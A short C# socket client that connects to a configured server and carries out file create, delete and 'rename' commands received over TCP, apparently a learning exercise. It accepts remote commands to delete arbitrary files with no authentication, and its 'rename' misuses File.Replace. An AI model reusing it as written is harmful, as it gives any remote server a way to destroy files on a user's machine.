using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.IO;

namespace ClientV
{
    class Program
    {
        static void Main(string[] args)
        {
            connectionsClient();
            Console.ReadKey();
        }

        private static void connectionsClient()
        {
            try
            {

            
            //Соединение с сервером
            IPAddress address = IPAddress.Parse(Properties.Settings.Default.IP);
            int port = int.Parse( Properties.Settings.Default.Port);
            IPEndPoint endPoint = new IPEndPoint(address,port);

            Socket socket = new Socket(SocketType.Stream, ProtocolType.Tcp);
            socket.Connect(endPoint);
            //----

            byte[] buffer = new byte[8196];
            string request = "";

            while (true)
            {
               int bytesRecorded = socket.Receive(buffer);
                request = Encoding.UTF8.GetString(buffer, 0, bytesRecorded);
                string[] command = request.Split('|');

                switch (command[0])
                {
                    case "create":
                        FileStream stream = File.Create(command[1]);
                        stream.Close();
                        break;

                    case "delete":
                        File.Delete(command[1]);
                            break;
                    case "rename":
                        File.Replace(command[1],command[2],"");
                        break;

                }

            }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Ахтунг \t\n"+ ex);
            }
        }
    }
}
